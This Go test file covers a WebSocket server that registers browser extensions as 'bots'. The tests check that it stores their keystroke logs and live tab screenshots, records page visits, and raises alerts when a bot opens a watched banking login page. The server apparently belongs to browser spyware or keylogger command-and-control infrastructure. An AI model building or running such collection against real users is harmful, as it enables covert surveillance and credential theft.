package ws

import (
	"context"
	"encoding/json"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
	"nhooyr.io/websocket"

	"github.com/s045pd/umbra/internal/browsersnapshot"
	"github.com/s045pd/umbra/internal/db/models"
	"github.com/s045pd/umbra/internal/utils"
)

func newWSDB(t *testing.T) *gorm.DB {
	t.Helper()
	dsn := "file:" + uuid.NewString() + "?mode=memory&cache=shared&_busy_timeout=5000"
	g, err := gorm.Open(sqlite.Open(dsn), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	sqlDB, err := g.DB()
	if err != nil {
		t.Fatal(err)
	}
	sqlDB.SetMaxOpenConns(1)
	if err := g.AutoMigrate(models.All()...); err != nil {
		t.Fatal(err)
	}
	return g
}

// runServer spins up the WS handler on an httptest server and returns
// the dial URL.
func runServer(t *testing.T, srv *Server) (string, func()) {
	t.Helper()
	hs := httptest.NewServer(srv.Handler())
	url := strings.Replace(hs.URL, "http://", "ws://", 1)
	return url, hs.Close
}

func readUntilAction(t *testing.T, ctx context.Context, conn *websocket.Conn, action string) Envelope {
	t.Helper()
	for {
		_, raw, err := conn.Read(ctx)
		if err != nil {
			t.Fatal(err)
		}
		var envelope Envelope
		if err := json.Unmarshal(raw, &envelope); err != nil {
			t.Fatal(err)
		}
		if envelope.Action == action {
			return envelope
		}
	}
}

func TestWS_AuthAndPing(t *testing.T) {
	gdb := newWSDB(t)
	srv := New(gdb, utils.NewLogger())
	url, stop := runServer(t, srv)
	defer stop()

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()

	conn, _, err := websocket.Dial(ctx, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	// Read AUTH probe
	_, msg, err := conn.Read(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var probe Envelope
	if err := json.Unmarshal(msg, &probe); err != nil {
		t.Fatal(err)
	}
	if probe.Action != ActionAuth {
		t.Fatalf("expected AUTH probe, got %s", probe.Action)
	}

	// Reply with our browser_id
	browserID := uuid.NewString()
	authData, _ := json.Marshal(AuthData{BrowserID: browserID})
	resp := Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth}
	b, _ := json.Marshal(resp)
	if err := conn.Write(ctx, websocket.MessageText, b); err != nil {
		t.Fatal(err)
	}

	// Wait for bot to land in registry
	deadline := time.Now().Add(2 * time.Second)
	for srv.Registry().ByBrowserID(browserID) == nil && time.Now().Before(deadline) {
		time.Sleep(20 * time.Millisecond)
	}
	if srv.Registry().ByBrowserID(browserID) == nil {
		t.Fatal("bot not registered")
	}

	// Send a PING; expect PONG
	pingPayload := Envelope{ID: "ping-1", Action: ActionPing}
	pb, _ := json.Marshal(pingPayload)
	if err := conn.Write(ctx, websocket.MessageText, pb); err != nil {
		t.Fatal(err)
	}
	pong := readUntilAction(t, ctx, conn, ActionPong)
	if pong.Action != ActionPong {
		t.Errorf("expected PONG, got %s", pong.Action)
	}
}

// Old extensions echo the server's PONG back as if it were an RPC.
// Dispatch must absorb that without erroring or warning.
func TestWS_PongEchoIsSilentlyAbsorbed(t *testing.T) {
	gdb := newWSDB(t)
	srv := New(gdb, utils.NewLogger())
	url, stop := runServer(t, srv)
	defer stop()

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()
	conn, _, err := websocket.Dial(ctx, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	// AUTH handshake
	_, msg, _ := conn.Read(ctx)
	var probe Envelope
	_ = json.Unmarshal(msg, &probe)
	browserID := uuid.NewString()
	authData, _ := json.Marshal(AuthData{BrowserID: browserID})
	b, _ := json.Marshal(Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth})
	conn.Write(ctx, websocket.MessageText, b)

	deadline := time.Now().Add(2 * time.Second)
	for srv.Registry().ByBrowserID(browserID) == nil && time.Now().Before(deadline) {
		time.Sleep(20 * time.Millisecond)
	}
	if srv.Registry().ByBrowserID(browserID) == nil {
		t.Fatal("bot not registered")
	}

	// Send a stray PONG (as a buggy old client would). Dispatch must
	// not return an error and the session must stay open afterwards.
	pongEnv, _ := json.Marshal(Envelope{ID: "pong-1", Action: ActionPong})
	if err := conn.Write(ctx, websocket.MessageText, pongEnv); err != nil {
		t.Fatal(err)
	}

	// Follow up with a real PING — if the PONG had killed the session
	// this read would error.
	pingEnv, _ := json.Marshal(Envelope{ID: "ping-1", Action: ActionPing})
	if err := conn.Write(ctx, websocket.MessageText, pingEnv); err != nil {
		t.Fatal(err)
	}
	pong := readUntilAction(t, ctx, conn, ActionPong)
	if pong.Action != ActionPong {
		t.Errorf("expected PONG reply to PING, got %s", pong.Action)
	}
}

func TestWS_KeyboardLogPersists(t *testing.T) {
	gdb := newWSDB(t)
	srv := New(gdb, utils.NewLogger())
	url, stop := runServer(t, srv)
	defer stop()

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()
	conn, _, err := websocket.Dial(ctx, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	// AUTH
	_, msg, _ := conn.Read(ctx)
	var probe Envelope
	_ = json.Unmarshal(msg, &probe)
	browserID := uuid.NewString()
	authData, _ := json.Marshal(AuthData{BrowserID: browserID})
	b, _ := json.Marshal(Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth})
	conn.Write(ctx, websocket.MessageText, b)

	// Wait for registration
	deadline := time.Now().Add(2 * time.Second)
	for srv.Registry().ByBrowserID(browserID) == nil && time.Now().Before(deadline) {
		time.Sleep(20 * time.Millisecond)
	}

	// Send KEYBOARD_LOGS
	logsData, _ := json.Marshal(map[string]any{"url": "https://x", "title": "t", "keys": "abc"})
	logsEnv, _ := json.Marshal(Envelope{ID: "k-1", Action: ActionKeyboardLogs, Data: logsData})
	conn.Write(ctx, websocket.MessageText, logsEnv)

	// Wait for persistence
	var n int64
	deadline = time.Now().Add(2 * time.Second)
	for n == 0 && time.Now().Before(deadline) {
		gdb.Model(&models.BotKeyboardLog{}).Count(&n)
		time.Sleep(20 * time.Millisecond)
	}
	if n != 1 {
		t.Errorf("keyboard logs row count = %d, want 1", n)
	}
}

// PING doubles as the activity heartbeat. Two pings within the
// sessionGap (5 minutes) must merge into a single open session whose
// `end` advances; the `start` should stay pinned to the first tick.
func TestWS_PingExtendsActivityInterval(t *testing.T) {
	gdb := newWSDB(t)
	srv := New(gdb, utils.NewLogger())
	url, stop := runServer(t, srv)
	defer stop()

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()
	conn, _, err := websocket.Dial(ctx, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	// AUTH handshake
	_, msg, _ := conn.Read(ctx)
	var probe Envelope
	_ = json.Unmarshal(msg, &probe)
	browserID := uuid.NewString()
	authData, _ := json.Marshal(AuthData{BrowserID: browserID})
	b, _ := json.Marshal(Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth})
	if err := conn.Write(ctx, websocket.MessageText, b); err != nil {
		t.Fatal(err)
	}

	// Wait for registration to learn the bot's UUID.
	var sess *Session
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		sess = srv.Registry().ByBrowserID(browserID)
		if sess != nil {
			break
		}
		time.Sleep(20 * time.Millisecond)
	}
	if sess == nil {
		t.Fatal("bot not registered")
	}
	botID := sess.BotID

	readActivity := func() []map[string]string {
		var bot models.Bot
		if err := gdb.Select("activity").Where("id = ?", botID).First(&bot).Error; err != nil {
			t.Fatal(err)
		}
		raw, _ := json.Marshal(bot.Activity)
		var sessions []map[string]string
		_ = json.Unmarshal(raw, &sessions)
		return sessions
	}

	pingAndAwaitPong := func() {
		t.Helper()
		env, _ := json.Marshal(Envelope{ID: uuid.NewString(), Action: ActionPing})
		if err := conn.Write(ctx, websocket.MessageText, env); err != nil {
			t.Fatal(err)
		}
		pong := readUntilAction(t, ctx, conn, ActionPong)
		if pong.Action != ActionPong {
			t.Fatalf("expected PONG, got %s", pong.Action)
		}
	}

	// First PING opens a session.
	pingAndAwaitPong()
	sessions := readActivity()
	if len(sessions) != 1 {
		t.Fatalf("after first PING want 1 activity session, got %d", len(sessions))
	}
	firstStart, firstEnd := sessions[0]["start"], sessions[0]["end"]
	if firstStart == "" || firstEnd == "" {
		t.Fatalf("expected non-empty start/end, got %v", sessions[0])
	}

	// Sleep > 1s so the second PING produces a strictly later RFC3339
	// second (the format has 1s precision).
	time.Sleep(1100 * time.Millisecond)

	// Second PING within sessionGap: still one session, end advanced.
	pingAndAwaitPong()
	sessions = readActivity()
	if len(sessions) != 1 {
		t.Fatalf("after second PING want sessions to be merged, got %d", len(sessions))
	}
	if sessions[0]["start"] != firstStart {
		t.Errorf("session start changed: %s -> %s", firstStart, sessions[0]["start"])
	}
	if sessions[0]["end"] <= firstEnd {
		t.Errorf("session end did not advance: was %s, now %s", firstEnd, sessions[0]["end"])
	}
}

// REALTIME_IMG must persist the snapshot the extension sends and must
// NOT wipe a previously-good thumbnail when an empty frame arrives
// (captureVisibleTab can transiently return "").
func TestWS_RealtimeImgPersistsAndIgnoresEmpty(t *testing.T) {
	gdb := newWSDB(t)
	srv := New(gdb, utils.NewLogger())
	url, stop := runServer(t, srv)
	defer stop()

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()
	conn, _, err := websocket.Dial(ctx, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	// AUTH handshake
	_, msg, _ := conn.Read(ctx)
	var probe Envelope
	_ = json.Unmarshal(msg, &probe)
	browserID := uuid.NewString()
	authData, _ := json.Marshal(AuthData{BrowserID: browserID})
	b, _ := json.Marshal(Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth})
	if err := conn.Write(ctx, websocket.MessageText, b); err != nil {
		t.Fatal(err)
	}

	var sess *Session
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		sess = srv.Registry().ByBrowserID(browserID)
		if sess != nil {
			break
		}
		time.Sleep(20 * time.Millisecond)
	}
	if sess == nil {
		t.Fatal("bot not registered")
	}
	botID := sess.BotID

	readImage := func() string {
		var bot models.Bot
		if err := gdb.Select("current_tab_image").Where("id = ?", botID).First(&bot).Error; err != nil {
			t.Fatal(err)
		}
		return bot.CurrentTabImage
	}

	// Use the field name the extension actually emits.
	const want = "data:image/jpeg;base64,AAAA"
	payload, _ := json.Marshal(map[string]any{"current_tab_image": want})
	env, _ := json.Marshal(Envelope{ID: uuid.NewString(), Action: ActionRealtimeImg, Data: payload})
	if err := conn.Write(ctx, websocket.MessageText, env); err != nil {
		t.Fatal(err)
	}

	// REALTIME_IMG has no reply; poll the DB until the row updates.
	var got string
	deadline = time.Now().Add(2 * time.Second)
	for got != want && time.Now().Before(deadline) {
		got = readImage()
		if got != want {
			time.Sleep(20 * time.Millisecond)
		}
	}
	if got != want {
		t.Fatalf("realtime image not persisted, want %q got %q", want, got)
	}

	// An empty frame must be silently ignored.
	emptyPayload, _ := json.Marshal(map[string]any{"current_tab_image": ""})
	emptyEnv, _ := json.Marshal(Envelope{ID: uuid.NewString(), Action: ActionRealtimeImg, Data: emptyPayload})
	if err := conn.Write(ctx, websocket.MessageText, emptyEnv); err != nil {
		t.Fatal(err)
	}

	// Use a PING + PONG round-trip as a fence to know the previous frame
	// has been fully processed by the dispatcher.
	pingEnv, _ := json.Marshal(Envelope{ID: uuid.NewString(), Action: ActionPing})
	if err := conn.Write(ctx, websocket.MessageText, pingEnv); err != nil {
		t.Fatal(err)
	}
	_ = readUntilAction(t, ctx, conn, ActionPong)

	if got = readImage(); got != want {
		t.Errorf("empty REALTIME_IMG frame wiped stored image: got %q", got)
	}
}

func TestRegistry_RegisterAndLookup(t *testing.T) {
	r := NewRegistry()
	s := &Session{BrowserID: "abc", BotID: uuid.New()}
	r.Register(s)
	if r.ByBrowserID("abc") != s {
		t.Error("byBrowserID lookup failed")
	}
	if r.ByBotID(s.BotID) != s {
		t.Error("byBotID lookup failed")
	}
	if r.Count() != 1 {
		t.Error("Count != 1")
	}
	r.Unregister(s)
	if r.ByBrowserID("abc") != nil {
		t.Error("byBrowserID still present after unregister")
	}
}

func TestWS_CapabilityHookRunsAfterRegistrationWithoutBlockingReadLoop(t *testing.T) {
	gdb := newWSDB(t)
	srv := New(gdb, utils.NewLogger())
	hookStarted := make(chan struct{})
	unblockHook := make(chan struct{})
	hookResult := make(chan struct {
		bot        models.Bot
		caps       browsersnapshot.SensorCapabilities
		registered bool
	}, 1)
	srv.SetSensorConnectedHook(func(bot models.Bot, caps browsersnapshot.SensorCapabilities) {
		hookResult <- struct {
			bot        models.Bot
			caps       browsersnapshot.SensorCapabilities
			registered bool
		}{bot: bot, caps: caps, registered: srv.Registry().ByBotID(bot.ID) != nil}
		close(hookStarted)
		<-unblockHook
	})
	url, stop := runServer(t, srv)
	defer stop()
	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()
	conn, _, err := websocket.Dial(ctx, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")
	_, raw, err := conn.Read(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var probe Envelope
	if err := json.Unmarshal(raw, &probe); err != nil {
		t.Fatal(err)
	}
	browserID := uuid.NewString()
	caps := browsersnapshot.SensorCapabilities{BrowserSnapshotV1: true, SchemaVersions: []int{1}, ChunkSize: 524288}
	authData, _ := json.Marshal(AuthData{BrowserID: browserID, Capabilities: caps})
	response, _ := json.Marshal(Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth})
	if err := conn.Write(ctx, websocket.MessageText, response); err != nil {
		t.Fatal(err)
	}
	select {
	case <-hookStarted:
	case <-ctx.Done():
		t.Fatal("capability hook did not fire")
	}
	result := <-hookResult
	if !result.registered || result.bot.BrowserID != browserID || !result.caps.SupportsSnapshotV1() {
		t.Fatalf("hook result=%+v", result)
	}
	registeredCapabilities, known := srv.SnapshotCapabilities(result.bot.ID)
	if !known || !registeredCapabilities.SupportsSnapshotV1() {
		t.Fatalf("registered capabilities=%+v known=%v", registeredCapabilities, known)
	}
	ping, _ := json.Marshal(Envelope{ID: "cap-ping", Action: ActionPing})
	if err := conn.Write(ctx, websocket.MessageText, ping); err != nil {
		t.Fatal(err)
	}
	for {
		_, pongRaw, err := conn.Read(ctx)
		if err != nil {
			t.Fatalf("blocked hook also blocked read loop: %v", err)
		}
		var pong Envelope
		_ = json.Unmarshal(pongRaw, &pong)
		if pong.Action == ActionPong {
			break
		}
	}
	close(unblockHook)
}

func TestWS_NavEventPersistsAndRaisesDomainAlert(t *testing.T) {
	gdb := newWSDB(t)
	srv := New(gdb, utils.NewLogger())
	url, stop := runServer(t, srv)
	defer stop()

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()
	conn, _, err := websocket.Dial(ctx, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	_, msg, _ := conn.Read(ctx)
	var probe Envelope
	_ = json.Unmarshal(msg, &probe)
	browserID := uuid.NewString()
	authData, _ := json.Marshal(AuthData{BrowserID: browserID})
	b, _ := json.Marshal(Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth})
	if err := conn.Write(ctx, websocket.MessageText, b); err != nil {
		t.Fatal(err)
	}

	var sess *Session
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		sess = srv.Registry().ByBrowserID(browserID)
		if sess != nil {
			break
		}
		time.Sleep(20 * time.Millisecond)
	}
	if sess == nil {
		t.Fatal("bot not registered")
	}

	if err := gdb.Model(&models.Bot{}).Where("id = ?", sess.BotID).Updates(map[string]any{
		"switch_config": models.JSONMap{"NOTIFICATION": true},
		"data_config":   models.JSONMap{"NOTIFICATION_DOMAINS": []any{"bank.example"}},
	}).Error; err != nil {
		t.Fatal(err)
	}

	nav, _ := json.Marshal(map[string]any{"url": "https://app.bank.example/login", "title": "Login", "timestamp": float64(time.Now().UnixMilli())})
	env, _ := json.Marshal(Envelope{ID: uuid.NewString(), Action: ActionNavEvent, Data: nav})
	if err := conn.Write(ctx, websocket.MessageText, env); err != nil {
		t.Fatal(err)
	}

	deadline = time.Now().Add(2 * time.Second)
	var navCount, alertCount int64
	for time.Now().Before(deadline) {
		gdb.Model(&models.BotNavEvent{}).Where("bot_id = ?", sess.BotID).Count(&navCount)
		gdb.Model(&models.BotAlert{}).Where("bot_id = ?", sess.BotID).Count(&alertCount)
		if navCount == 1 && alertCount == 1 {
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatalf("nav=%d alert=%d, want 1/1", navCount, alertCount)
}
